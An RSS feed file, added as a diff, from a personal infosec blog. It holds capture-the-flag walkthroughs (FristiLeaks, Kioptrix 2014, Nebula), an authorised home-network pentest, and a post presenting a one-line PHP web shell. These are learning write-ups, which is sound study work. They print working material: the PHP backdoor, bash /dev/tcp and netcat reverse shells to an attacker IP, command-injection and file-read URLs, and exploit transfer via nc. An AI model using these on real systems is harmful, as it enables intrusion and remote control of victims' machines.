@@ -1,0 +1,343 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>PHP &#8211; Graeme Robinson&#039;s blog</title>
+	<atom:link href="/category/php/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A place for my thoughts when I was starting to break into the information security feild</description>
+	<lastBuildDate>Sun, 22 Oct 2017 11:31:46 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.6.2</generator>
+	<item>
+		<title>FristiLeaks 1.3</title>
+		<link>/fristileaks-1-3/</link>
+					<comments>/fristileaks-1-3/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 22 Oct 2017 11:29:27 +0000</pubDate>
+				<category><![CDATA[Compromise]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Passwords]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<guid isPermaLink="false">/?p=321</guid>
+
+					<description><![CDATA[Following on from my previous post about Kioptrix 2014, this post will be about how I got root on the next VM in the list, which is FristiLeaks 1.3 So the first thing I did after turning the VM on &#8230; <a href="/fristileaks-1-3/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/fristileaks-1-3/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Kioptrix 2014</title>
+		<link>/kioptrix-2014/</link>
+					<comments>/kioptrix-2014/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 12 Oct 2017 20:48:43 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Uncategorized]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<guid isPermaLink="false">/?p=312</guid>
+
+					<description><![CDATA[My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, &#8230; <a href="/kioptrix-2014/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>My lab time in the PWK course labs ran out a while back and I wasn&#8217;t ready for the exam. I think I understand all the theory that I need, it just takes m e too long to PWN systems, so I decided to try a few Vulnhub VMs. <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">This article</a> has a list of 10 that I will be trying, the first of which is <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix 2014</a>.</p>
+<p>There are already walkthroughs all over the web, so I don&#8217;t feel like I&#8217;m giving away any spoilers here. I&#8217;m mostly documenting it for my own notes, but of course it can be used for hints if you&#8217;re going to give it a try.</p>
+<p>I wanted to run in in VirtualBox, which requires the use of the extra &#8220;kiop2014_fix.zip&#8221; file as wall as the VMDK from the main kiop2014.tar.bz2</p>
+<p>After starting the VM, I had to find the system&#8217;s IP address, so I ran netdiscover and it was quickly found. To find the open ports and identify the services, I ran nmap:</p>
+<pre>root@kali:~# nmap [IP-REDACTED] -sV
+
+Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-11 15:59 EDT
+Nmap scan report for kioptrix2014.lan ([IP-REDACTED])
+Host is up (0.00044s latency).
+Not shown: 997 filtered ports
+PORT STATE SERVICE VERSION
+22/tcp closed ssh
+<strong>80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+<strong>8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</strong>
+MAC Address: 08:00:27:DC:55:1C (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds</pre>
+<p>Opening a web browser on port 8080 shows a 403 forbidden error message. Nothing too interesting in the response. The page returned on port 80 is more interesting though&#8230; When rendered, it&#8217;s just a heading that says &#8220;It works!&#8221;, but the source includes a commented out &lt;meta refresh&gt; that would redirect the browser to http://[IP-REDACTED]/pChart2.1.3/examples/index.php.</p>
+<p>Initially, I thought I could inject some PHP in here. For example if I went to the sandbox and  changed my chart title to <strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong> then clicked the &#8220;Show code&#8221; button, it showed me that one line of code that would run would be</p>
+<pre>$myPicture-&gt;drawText(350,25,"-".shell_exec("whoami")."-",$TextSettings);</pre>
+<p>but when I clicked &#8220;Render picture&#8221;, the title was<strong>-&#8220;.shell_exec(&#8220;whoami&#8221;).&#8221;-</strong>, so it must have escaped it somehow when it really made the picture. Damn.</p>
+<p>Next thing to try is looking for a known exploit for pChart:</p>
+<pre>root@kali:~# searchsploit pchart
+--------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+--------------------------------------------- ----------------------------------
+pChart 2.1.3 - Multiple Vulnerabilities | php/webapps/31173.txt
+--------------------------------------------- ----------------------------------</pre>
+<p>That txt file suggests that I can read any file on the system that the account running apache can read using a maliciously crafted url, for example http://[IP-REDACTED]/examples/index.php?Action=View&amp;Script=/etc/passwd</p>
+<p>Interestingly, we can see how this exploit works by examining the first line of index.php, which can be seen by visiting http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action=View&amp;Script=index.php , which is:</p>
+<pre>&lt;?php if ( isset($_GET["Action"])) { $Script = $_GET["Script"]; highlight_file($Script); exit(); } ?&gt;</pre>
+<p>. We don&#8217;t even really need a value set for &#8220;Action&#8221;; http://[IP-REDACTED]/pChart2.1.3/examples/index.php?<strong>Action</strong>&amp;Script=index.php works just as well.</p>
+<p>Anyway, there&#8217;s not much of great interest that this account can access, but perhaps we can find out why we are seeing a 403 forbidden response when we connect to port 8080&#8230;</p>
+<p><a href="https://www.freebsd.org/doc/handbook/network-apache.html">The apache config file on FreeBSD is located in /usr/local/etc/apache2x/httpd.conf</a>, (on this system, since it&#8217;s apache 2.2, we should replace the &#8220;x&#8221; with a &#8220;2&#8221;) so we&#8217;ll look at that with http://[IP-REDACTED]/pChart2.1.3/examples/index.php?Action&amp;Script=/usr/local/etc/apache22/httpd.conf and at the bottom of the file is:</p>
+<pre>SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
+
+&lt;VirtualHost *:8080&gt;
+    DocumentRoot /usr/local/www/apache22/data2
+
+&lt;Directory "/usr/local/www/apache22/data2"&gt;
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+&lt;/Directory&gt;</pre>
+<p>This tells us that port 8080 is serving files from /usr/local/www/apache22/data2, and that requests will only be allowed if the user agent starts with &#8220;Mozilla/4.0 Mozilla4_browser&#8221; . See https://httpd.apache.org/docs/2.4/mod/mod_setenvif.html and http://httpd.apache.org/docs/current/mod/mod_access_compat.html#allow for more details of how that works.</p>
+<p>Changing our user agent to &#8220;Mozilla/4.0 Mozilla4_browser_NOT REALLY!&#8221; makes apache respond to our requests to port 80, and the response says that there is a directory called phptax. This shows us a very ugly and dated web application that I clicked around, but couldn&#8217;t find anything interesting, so I used searchsploit again:</p>
+<pre>root@kali:~# searchsploit phptax
+------------------------------------------------------------------ ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------ ----------------------------------
+PhpTax - pfilez Parameter Exec Remote Code Injection (Metasploit) | php/webapps/21833.rb
+phptax 0.8 - Remote Code Execution | php/webapps/21665.txt
+PhpTax 0.8 - File Manipulation (newvalue) / Remote Code Execution | php/webapps/25849.txt
+------------------------------------------------------------------ ----------------------------------</pre>
+<p>The second one looks interesting, it basically says that we can get remote code execution because user input is not sanitised before being used in php&#8217;s exec() function. I&#8217;ll confirm this works by writing a <a href="/single-line-php-script-to-gain-shell/">single line php backdoor file</a> by visiting http://[IP-REDACTED]:8080/phptax/drawimage.php?pfilez=xxx;echo &#8220;&lt;?php echo shell_exec(\$_GET[&#8216;e&#8217;].&#8217; 2&gt;%261&#8242;);?&gt;&#8221;&gt;backdoor.php;&amp;pdf=make in my browser, then http://[IP-REDACTED]:8080/backdoor.php?e=whoami to make sure it worked. It did, and now I can execute shell commands <strong>and see the output</strong></p>
+<p>It would be really nice to have a remote shell. I tried using &#8220;nc &lt;IP&gt; &lt;PORT&gt; -e /bin/sh&#8221;, but that didn&#8217;t work and &#8220;nc -h&#8221; showed why; -e is for specifying an IPsec policy (whatever that means) on this version of nc. We&#8217;ll have to try something else; I remember some time ago that I was able to use a named fifo pipe in order to get a shell with nc. This command worked for me to connect to a netcat listener:</p>
+<pre>mkfifo pipe;nc [IP ADDR] [PORT]&lt;pipe|/bin/sh&gt;pipe 2&gt;pipe;rm pipe</pre>
+<p>Running &#8220;uname -r&#8221; tells us that we&#8217;re on a FreeBSD 9.0 system. Let&#8217;s try to get root. Back to searchsploit:</p>
+<pre>root@kali:~# searchsploit -t FreeBSD 9
+------------------------------------------------------------------------- ----------------------------------
+ Exploit Title | Path
+ | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------------- ----------------------------------
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20810.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20811.cpp
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20812.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | multiple/dos/20813.c
+FreeBSD 2.x / HP-UX 9/10/11 / Kernel 2.0.3 / Windows NT 4.0/Server 2003 | windows/dos/20814.c
+FreeBSD 9.1 ftpd - Remote Denial of Service | freebsd/dos/24450.txt
+FreeBSD mcweject 0.9 (eject) - Buffer Overflow Privilege Escalation | bsd/local/3578.c
+BSD/OS 2.1 / DG/UX 4.0 / Debian 0.93 / Digital UNIX 4.0 B / FreeBSD 2.1. | unix/local/19203.c
+FreeBSD 9.0 &lt; 9.1 mmap/ptrace - Privilege Escalation | freebsd/local/26368.c
+FreeBSD 9 - Address Space Manipulation Privilege Escalation (Metasploit) | freebsd/local/26454.rb
+FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation | freebsd/local/28718.c
+FreeBSD/x86 - rev connect_ recv_ jmp_ return results Shellcode (90 bytes | freebsd_x86/shellcode/13265.c
+FreeBSD/x86 - Rortbind Reverse 127.0.0.1:8000 /bin/sh Shellcode (89 byte | freebsd_x86/shellcode/13267.asm
+------------------------------------------------------------------------- ----------------------------------</pre>
+<p>26368 looks promising, let&#8217;s send it to the remote machine. I ran this on my attacking machine:</p>
+<pre>searchsploit -m 26368;nc -vnlp 6666 &lt;26368.c</pre>
+<p>then ran this on the remote system:</p>
+<pre>nc 192.168.23.120 6666 &gt;26368.c</pre>
+<p>and after a few seconds, I hit CTRL+C to close the nc session. Not I have the exploit on the FreeBSD system, so I can compile it and run it:</p>
+<pre>gcc 26368.c -o 26368
+./26368
+whoami
+root</pre>
+<p>We&#8217;ve got root! Inside root&#8217;s home directory is a nice txt file with some interesting information that we can read using cat</p>
+<p>I recently learned that <a href="http://www.kioptrix.com/blog/farewell-loneferret/">the guy that made this VM (Steven “loneferret” McElrea) passed away a couple of months ago</a>. I&#8217;m grateful for the time he put into making this VM and my thoughts go out to his family.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/kioptrix-2014/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>My first pentest on a friend&#8217;s network</title>
+		<link>/my-first-pentest-on-a-friends-network/</link>
+					<comments>/my-first-pentest-on-a-friends-network/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 06 Jan 2013 16:31:58 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Lesson Learned]]></category>
+		<category><![CDATA[OS X]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<category><![CDATA[WebApp]]></category>
+		<guid isPermaLink="false">/?p=227</guid>
+
+					<description><![CDATA[Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that &#8230; <a href="/my-first-pentest-on-a-friends-network/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that were not password protected running out of their home public IP address.</p>
+<p>I saw them over the Christmas/new year period and they gave me permission to try and penetrate their network, specifically they challenged me to change the root password on their unRAID server.</p>
+<p>I started off by firing up my Backtrack 5r3 VM and updating everything before registering Nessus and performing a scan of his public IP address.</p>
+<p>Nessus didn&#8217;t find anything that was listed as critical, but it did show me that we had ssh running on port 22 and it also showed me all other ports that were open and had web servers running on them. I checked them all out and I found on various ports; the default Lion server webpage, SABNZBd, SickBeard, Transmission, and the unRAID server.</p>
+<p>The website served by the unRAID server was asking for a username and password using basic access authentication. That was no use so I started looking into the other services. Not only were the operating interfaces unsecured, but their configuration sections were also open to anyone. I saw that SABNZBd was running as &#8220;admin&#8221; and that it had an option of running scripts when a download had completed. The method was to point SABNZBd to a folder containing scripts, start a download and then choose what script to run on completion. I knew I could download a file using SABNZBd or Transmission to any directory that the admin user had write permissions to, but I didn&#8217;t know at this stage how to make it executable.</p>
+<p>I saw in SABNZBd&#8217;s preferences that I could specify the permissions (in octal format) of files and folders that were downloaded, so I ran SABNZBd on my machine, created a binary post on a newsgroup containing a script that was basically a reverse shell and tested a download to my machine with SABNZBd set to mark everything at 777. It created a folder with 777 permissions, but the file was only 555. Presumably this was for security reasons &#8211; damn!</p>
+<p>At this point I was wishing that his machine was running Windows not OSX because SABNZBd on Windows only requires that a scripts file extension is in the PATHEXT environment variable. That would have been much easier than getting a file marked as executable.</p>
+<p>I had to find another way of making an executable script on that machine. How could I get that machine to run my commands without having an executable script set&#8230; The web server or course. I created my single line PHP shell again (mentioned in a previous post) and set Transmission to download files to the Lion web server default folder, created a torrent containing my php script and downloaded the torrent to the server using transmission. I tested it, with the command <strong>whoami</strong>, and it worked. I was in, but I was only the user _www.</p>
+<p>What could I do as _www? Not much, but I was able to create a reverse shell using netcat and take a look around the system. I couldn&#8217;t access admin&#8217;s files yet, but of course I could write to /tmp. If I could write to /tmp, I could create a script and mark it as executable by everyone. Then I could get SABNZBd to run it! I started thinking about making a script that would create a reverse shell, then it dawned on me: create a public/private key pair and add it to /Users/admin/.ssh/authorized_keys.</p>
+<p>I uploaded my public key using my php shell script, and then created an executable script in /tmp that appended my key to authorized_keys.</p>
+<p>I started a new SABNZBd download (I decided to just download something that was small, free and released under the CC license) so as no to upset anyone. Obviously I now set my script to run. All went well and I could now ssh into the machine as the admin user without a password.</p>
+<p>At this point I cleaned up everything I had downloaded and just left my key in place so I could log in. I took a look around, but I couldn&#8217;t see anything to do with the unRAID server, so I thought I should report how far I had got.</p>
+<p>They were surprised, and while I didn&#8217;t get into the unRAID server, I had gotten a lot further than they thought anyone would be able to. As a result of this, they have since enabled logins on all their web services and removed my public key, but they still do have some vulnerabilities, like ssh running on a default port and allowing password authentication (ripe for brute forcing). They are a lot safer than they were, but it may well be worth me going back and having another go at some point in the future.</p>
+<p>A lot of the methods that I have used in this test were inspired by the challenges I have been working through in hackthissite.org and exploit-excercises.com and I&#8217;m very grateful to them for making the challenges.</p>
+<p>I&#8217;m tempted to try and create a VM with this vulnerable setup and release it. I would have to check the licences, but I think most of it could be done using open source solutions (linux, apache, sabnzbd, transmission)</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/my-first-pentest-on-a-friends-network/feed/</wfw:commentRss>
+			<slash:comments>9</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 05</title>
+		<link>/exploit-exercises-nebula-level-05/</link>
+					<comments>/exploit-exercises-nebula-level-05/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 23:44:00 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=210</guid>
+
+					<description><![CDATA[Not much information to start on this one: Check the flag05 home directory. You are looking for weak directory permissions To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05. The command &#8230; <a href="/exploit-exercises-nebula-level-05/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Not much information to start on this one:</p>
+<p style="padding-left: 30px;">Check the <em>flag05</em> home directory. You are looking for weak directory permissions<br />
+To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
+<p>The command <strong>ll</strong> (an alias for <strong>ls-alF</strong>) showed me that I had read access to ~flag05/.backup, and in there was a backup gzipped tar. Hopefully some goodies in here&#8230;</p>
+<p>I unpacked the tar and found that it contained a folder called .ssh. This is used for secure shell authentication. That folder contained a private/public key pair and an authorized_keys file. The authorised_keys file is exactly the same as the public key file, so (assuming that the authorised_keys file had not been deleted since the backup) I should be able to ssh in using the private key, as long as it was not encrypted with a passphrase.</p>
+<p>I copied the id_rsa file to ~/.ssh and tried to connect using:</p>
+<pre lang="Bash">ssh flag05@localhost</pre>
+<p>Bingo!</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-05/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Single Line PHP Script to Gain Shell</title>
+		<link>/single-line-php-script-to-gain-shell/</link>
+					<comments>/single-line-php-script-to-gain-shell/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 23 Sep 2012 21:48:19 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<category><![CDATA[WebApp]]></category>
+		<guid isPermaLink="false">/?p=79</guid>
+
+					<description><![CDATA[A while ago, on PaulDotCom Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about &#8230; <a href="/single-line-php-script-to-gain-shell/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>A while ago, on <a title="PaulDotCom" href="http://pauldotcom.com/" target="_blank" rel="noopener">PaulDotCom</a> Security Weekly, I heard someone mention something about a single line php script to get shell on the web server. I knew it couldn&#8217;t be that hard as it&#8217;s only one line, but I didn&#8217;t find much about it on google when I searched, perhaps because it&#8217;s too easy, or perhaps I was using the wrong search terms. Anyway, I forgot about it for a while&#8230; until now.</p>
+<p>Since WebApp security is what I&#8217;m most interested in at the moment, I have been learning PHP, I&#8217;m not finished learning yet, but today (while reading about how inputs should be sanitised before using &#8220;include&#8221;) I remembered the single line PHP shell, and I had a go and this is what I came up with:</p>
+<pre lang="PHP"><?php echo shell_exec($_GET['e'].' 2>&1'); ?></pre>
+<p>Obviously the WebApp would have to be vulnerable in some way in order to be able to put this script on the server, but once it was, it could potentially be used to do things like dump files and deface the site.</p>
+<p>The output is just text, not an HTML document so if using a web browser, you will want to view the source in order to see the proper result.</p>
+<p>I used <a title="shell_exec() in manual on PHP.net" href="http://php.net/manual/en/function.shell-exec.php" target="_blank" rel="noopener"><code>shell_exec()</code></a> instead of just <a title="exec() in manual on PHP.net" href="http://php.net/manual/en/function.exec.php" target="_blank" rel="noopener"><code>exec()</code></a> because it returns every line instead of just the last one. An alternative is to use <a title="passthru() in manual on PHP.net" href="http://php.net/manual/en/function.passthru.php" target="_blank" rel="noopener"><code>passthru()</code></a> which will also send binary data, but to get that to work properly with binary data, you&#8217;d probably have to also set the headers which makes it more than one line.</p>
+<p>I was able to run unix commands (windows commands should also work if the host is running windows) such as:</p>
+<ul>
+<li><code>shell.php?e=whoami</code></li>
